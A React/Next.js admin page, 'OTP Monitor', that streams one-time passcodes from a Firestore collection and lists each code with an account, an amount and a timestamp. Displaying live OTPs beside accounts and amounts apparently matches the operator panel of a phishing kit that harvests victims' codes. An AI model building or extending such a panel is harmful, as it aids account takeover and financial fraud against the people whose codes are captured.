"use client";

import { useEffect, useState } from "react";
import {
  collection,
  onSnapshot,
  query,
  orderBy,
  doc,
  getDoc,
  deleteDoc,
} from "firebase/firestore";
import { db } from "@/lib/firebaseClient";
import { motion } from "framer-motion";

export default function OtpAdminPage() {
  const [otps, setOtps] = useState([]);
  const [currentUser, setCurrentUser] = useState(null);

  // 🔹 Get logged-in user (session)
  useEffect(() => {
    const unsub = onSnapshot(doc(db, "sessions", "current"), (snap) => {
      if (snap.exists()) setCurrentUser(snap.data());
      else setCurrentUser(null);
    });
    return () => unsub();
  }, []);

  useEffect(() => {
    const q = query(
      collection(db, "otp"),
      orderBy("createdAt", "desc")
    );

    const unsub = onSnapshot(q, async (snap) => {
      const otpData = await Promise.all(
        snap.docs.map(async (d) => {
          const data = d.data();

          return {
            id: d.id,
            ...data,
            // ✅ use logged-in user's full name
            username: currentUser?.fullName || "Unknown",
          };
        })
      );

      setOtps(otpData);
    });

    return unsub;
  }, [currentUser]);

  const handleDelete = async (id) => {
    if (!confirm("Delete this OTP?")) return;
    await deleteDoc(doc(db, "otp", id));
  };

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      className="min-h-screen bg-slate-950 text-white p-4"
    >
      <h1 className="text-xl font-semibold mb-3 text-center">OTP Monitor</h1>

      <div>
        {otps.length === 0 && <p className="text-slate-400">No OTPs yet.</p>}

        {otps.map((o) => (
          <div
            key={o.id}
            className="bg-slate-900 p-4 border-t border-slate-800 flex justify-between items-start gap-4"
          >
            <div className="space-y-1 text-sm">
              {/* <p><b>User:</b> {o.username}</p> */}
              <p><b>OTP:</b> {o.code}</p>
              <p><b>Account:</b> {o.account}</p>
              <p><b>Amount:</b> ${o.amount}</p>
              <p className="text-xs text-slate-400">
                <b>Received:</b>{" "}
                {o.createdAt?.toDate
                  ? o.createdAt.toDate().toLocaleString()
                  : "—"}
              </p>
            </div>

            <button
              onClick={() => handleDelete(o.id)}
              className="text-red-400 hover:text-white hover:bg-red-600 transition text-sm border border-red-500/40 px-3 py-1 rounded"
            >
              Delete
            </button>
          </div>
        ))}
      </div>
    </motion.div>
  );
}
